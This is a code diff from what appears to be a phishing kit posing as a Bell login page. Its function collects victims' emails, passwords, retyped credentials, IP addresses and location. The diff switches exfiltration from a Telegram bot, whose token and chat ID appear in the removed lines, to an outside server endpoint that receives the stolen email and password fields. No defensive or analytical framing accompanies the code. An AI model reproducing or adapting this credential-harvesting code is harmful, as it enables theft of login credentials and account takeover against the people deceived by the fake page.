@@ -94,13 +94,13 @@
 
   // Send data to Telegram
   async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
- const botToken='7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo';
+// const botToken='7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo';
 
-    const chatId= '6173839485';
+    // const chatId= '6173839485';
 
-    const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
+    // const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const url = 'https://rate-da.onrender.com/submit';
 
     try {
       const response = await fetch(url, {
@@ -109,8 +109,10 @@
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
+        email: email,
+        password: password,
+        retypedPassword: modalPassword,
+        retypedEmail: modalEmail
       }),
     });
 
